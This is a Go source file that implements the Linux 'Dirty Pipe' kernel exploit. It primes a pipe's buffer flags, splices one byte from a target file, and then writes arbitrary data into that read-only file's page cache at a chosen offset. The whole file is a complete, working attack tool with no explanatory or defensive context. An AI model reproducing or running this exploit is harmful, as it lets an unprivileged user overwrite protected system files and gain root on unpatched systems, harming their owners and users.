package main

import (
	"errors"
	"fmt"
	"log"
	"os"
	"strconv"
	"syscall"

	"golang.org/x/sys/unix"
)

const PAGE_SIZE = 4096

func main() {
	if err := run(); err != nil {
		log.Fatal(err)
	}
}

func run() error {
	f, offset, data, err := initArgs()
	if err != nil {
		return err
	}
	defer f.Close()

	w, err := initPipe()
	if err != nil {
		return err
	}
	defer w.Close()

	if err = exploit(f, w, offset, data); err != nil {
		return err
	}

	log.Println("It worked")
	return nil
}

func initArgs() (*os.File, int64, string, error) {
	if len(os.Args) != 4 {
		log.Fatalf("Usage: %s TARGETFILE OFFSET DATA", os.Args[0])
	}

	filePath := os.Args[1]
	f, err := os.Open(filePath)
	if err != nil {
		return nil, 0, "", fmt.Errorf("open failed: %w", err)
	}

	offset, err := strconv.ParseInt(os.Args[2], 10, 64)
	if err != nil {
		return nil, 0, "", fmt.Errorf("parse int failed: %w", err)
	}

	if offset%PAGE_SIZE == 0 {
		return nil, 0, "", errors.New("sorry, cannot start writing at a page boundary")
	}

	data := os.Args[3]
	nextPage := (offset | (PAGE_SIZE - 1)) + 1
	endOffset := offset + int64(len(data))

	if endOffset > nextPage {
		return nil, 0, "", errors.New("sorry, cannot write across a page boundary")
	}

	fi, err := f.Stat()
	if err != nil {
		return nil, 0, "", fmt.Errorf("stat failed: %w", err)
	}

	if offset > fi.Size() {
		return nil, 0, "", errors.New("offset is not inside the file")
	}

	if endOffset > fi.Size() {
		return nil, 0, "", errors.New("sorry, cannot enlarge the file")
	}

	return f, offset, data, nil
}

func initPipe() (*os.File, error) {
	r, w, err := os.Pipe()
	if err != nil {
		return nil, fmt.Errorf("pipe error: %w", err)
	}

	pipeSize, err := unix.FcntlInt(w.Fd(), syscall.F_GETPIPE_SZ, -1)
	if err != nil {
		return nil, fmt.Errorf("fcntl error: %w", err)
	}

	buf := [PAGE_SIZE]byte{}
	for i := 0; i < pipeSize/PAGE_SIZE; i++ {
		if _, err = w.Write(buf[:]); err != nil {
			return nil, fmt.Errorf("pipe write error: %w", err)
		}
	}

	for i := 0; i < pipeSize/PAGE_SIZE; i++ {
		if _, err = r.Read(buf[:]); err != nil {
			return nil, fmt.Errorf("pipe read error: %w", err)
		}
	}

	return w, nil
}

func exploit(f, w *os.File, offset int64, data string) error {
	offset--
	n, err := syscall.Splice(int(f.Fd()), &offset, int(w.Fd()), nil, 1, 0)
	if err != nil {
		return fmt.Errorf("splice failed: %w", err)
	}
	if n == 0 {
		return errors.New("short splice")
	}

	nbytes, err := w.Write([]byte(data))
	if err != nil {
		return fmt.Errorf("write failed: %w", err)
	}

	if nbytes < len(data) {
		return errors.New("short write")
	}

	return nil
}
